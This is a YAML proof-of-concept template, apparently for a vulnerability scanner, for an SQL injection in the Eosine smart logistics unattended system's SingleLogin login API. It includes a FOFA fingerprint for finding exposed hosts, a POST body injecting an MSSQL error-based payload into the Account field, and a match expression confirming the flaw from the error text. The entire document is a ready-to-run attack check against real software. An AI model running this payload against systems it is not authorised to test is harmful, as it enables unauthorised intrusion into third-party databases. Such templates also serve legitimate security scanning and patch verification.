id: poc-yaml-eosine-snglelogin-sqli
info:
  name: 易思智能物流无人值守系统 snglelogin SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 易思智能物流无人值守系统
  fofa: body="/api/SingleLogin"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /api/SingleLogin/login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: LoginUserType=0&DeviceType=2&Account=1'%20and%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{.t1}}'))=1--&BrowserType=Firefox&Verifycode=&IMEI=&isverify=false&SetOfBooks=Default&Espassword=1wD%2Bj6eIbahZGOatg1Spiw%3D%3D
  expression: status_code == 200 && contains(body,"0x"+ t2) && contains(body,"转换成数据类型
    int 时失败") && contains(body,"在将 nvarchar 值")
transport: http
